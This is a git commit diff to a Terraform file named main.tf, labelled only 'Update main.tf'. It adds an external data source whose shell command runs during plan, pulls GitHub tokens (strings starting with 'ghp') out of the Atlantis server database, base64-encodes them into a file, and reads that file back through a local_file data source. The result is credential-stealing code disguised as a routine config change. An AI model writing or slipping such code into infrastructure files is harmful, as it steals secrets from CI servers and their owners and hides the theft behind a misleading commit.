bea2c048ddede7fadb868e6db791e9ed7a6c02ba
alexandrediasonepoint <125377065+alexandrediasonepoint@users.noreply.github.com>
2023-03-17 10:30:01 +0100

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,2 +1,6 @@
-resource "null_resource" "exambetter2" {
+data "external" "example" {
+  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | uniq | base64 > foo.bar"]
+}
+data "local_file" "foo" {
+    filename = "${path.module}/foo.bar"
 }
